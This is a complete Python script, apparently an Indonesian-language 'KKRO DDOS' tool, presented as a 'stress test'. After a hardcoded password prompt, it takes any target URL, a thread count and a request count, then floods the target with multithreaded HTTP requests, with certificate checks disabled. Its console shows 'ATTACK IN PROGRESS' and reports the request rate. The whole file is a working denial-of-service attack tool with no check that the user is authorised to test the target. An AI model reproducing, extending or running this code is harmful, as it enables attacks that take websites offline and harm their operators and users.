import threading
import urllib.request
import time
import ssl
import os
import sys

# ==================== PASSWORD SIMPLE ====================
PASSWORD = "kkro123"  # GANTI PASSWORD DI SINI

def check_password():
    print("\033[1;36m" + "╔══════════════════════════════════════════════════════════════════╗")
    print("║                   🔐 KKRO DDOS - PROTECTED ACCESS 🔐                  ║")
    print("╚══════════════════════════════════════════════════════════════════╝\033[0m\n")
    
    for attempt in range(3):
        try:
            # Pakai input biasa, bukan getpass (untuk Termux compatibility)
            pw = input("\033[1;33m[?] PASSWORD: \033[0m")
            if pw == PASSWORD:
                print("\033[1;32m[✓] AKSES DIIJINKAN!\033[0m\n")
                time.sleep(1)
                return True
            else:
                print(f"\033[1;31m[✗] Password salah ({attempt+1}/3)\033[0m")
        except:
            print("\033[1;31m[✗] Input error\033[0m")
    
    print("\033[1;31m[!] AKSES DITOLAK! Terlalu banyak percobaan.\033[0m")
    return False

# ==================== TAMPILAN UTAMA ====================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_header():
    clear_screen()
    print("\033[1;31m" + "╔═══════════════════════════════════════════════════════════════════════════════════╗")
    print("║                                                                                               ║")
    print("║  ██╗  ██╗██╗  ██╗██████╗  ██████╗        ██████╗ ██████╗  ██████╗ ███████╗                    ║")
    print("║  ██║ ██╔╝██║ ██╔╝██╔══██╗██╔═══██╗      ██╔═══██╗██╔══██╗██╔═══██╗██╔════╝                    ║")
    print("║  █████╔╝ █████╔╝ ██████╔╝██║   ██║      ██║   ██║██║  ██║██║   ██║███████╗                    ║")
    print("║  ██╔═██╗ ██╔═██╗ ██╔══██╗██║   ██║      ██║   ██║██║  ██║██║   ██║╚════██║                    ║")
    print("║  ██║  ██╗██║  ██╗██║  ██║╚██████╔╝      ╚██████╔╝██████╔╝╚██████╔╝███████║                    ║")
    print("║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝        ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝                    ║")
    print("║                                                                                               ║")
    print("║                     ⚡ DDOS STRESS TEST TOOL v3.0 ⚡                                          ║")
    print("║                                                                                               ║")
    print("╚═══════════════════════════════════════════════════════════════════════════════════╝\033[0m\n")

def main():
    if not check_password():
        sys.exit(1)
    
    show_header()
    
    # Input target
    print("\033[1;36m" + "═" * 80)
    print(" " * 30 + "🎯 INPUT TARGET")
    print("═" * 80 + "\033[0m\n")
    
    url = input("\033[1;33m[+] URL TARGET: \033[0m").strip()
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        threads = int(input("\033[1;33m[+] THREADS: \033[0m"))
        requests = int(input("\033[1;33m[+] REQUESTS PER THREAD: \033[0m"))
    except:
        print("\033[1;31m[!] Input invalid\033[0m")
        return
    
    # Start attack
    ctx = ssl._create_unverified_context()
    sent = 0
    failed = 0
    start = time.time()
    
    def attack():
        nonlocal sent, failed
        for _ in range(requests):
            try:
                urllib.request.urlopen(url, timeout=5, context=ctx)
                sent += 1
            except:
                failed += 1
    
    attack_threads = []
    for i in range(threads):
        t = threading.Thread(target=attack)
        t.start()
        attack_threads.append(t)
    
    # Progress display
    while any(t.is_alive() for t in attack_threads):
        elapsed = time.time() - start
        if elapsed > 0:
            speed = sent / elapsed
        else:
            speed = 0
        
        clear_screen()
        show_header()
        
        print("\033[1;36m" + "═" * 80)
        print(" " * 30 + "⚡ ATTACK IN PROGRESS")
        print("═" * 80 + "\033[0m\n")
        
        print(f"   \033[1;33mTARGET:\033[0m {url}")
        print(f"   \033[1;33mTIME:\033[0m {elapsed:.1f}s")
        print(f"   \033[1;32mSENT:\033[0m {sent:,}")
        print(f"   \033[1;31mFAILED:\033[0m {failed:,}")
        print(f"   \033[1;35mSPEED:\033[0m {speed:.0f}/s")
        
        time.sleep(0.3)
    
    # Results
    clear_screen()
    show_header()
    print("\033[1;36m" + "═" * 80)
    print(" " * 30 + "📊 ATTACK COMPLETE")
    print("═" * 80 + "\033[0m\n")
    
    elapsed = time.time() - start
    print(f"   \033[1;32mSUCCESSFUL:\033[0m {sent:,} requests")
    print(f"   \033[1;31mFAILED:\033[0m {failed:,} requests")
    print(f"   \033[1;33mDURATION:\033[0m {elapsed:.1f} seconds")
    
    if elapsed > 0:
        print(f"   \033[1;35mAVERAGE SPEED:\033[0m {sent/elapsed:.1f} req/sec")

if __name__ == "__main__":
    main()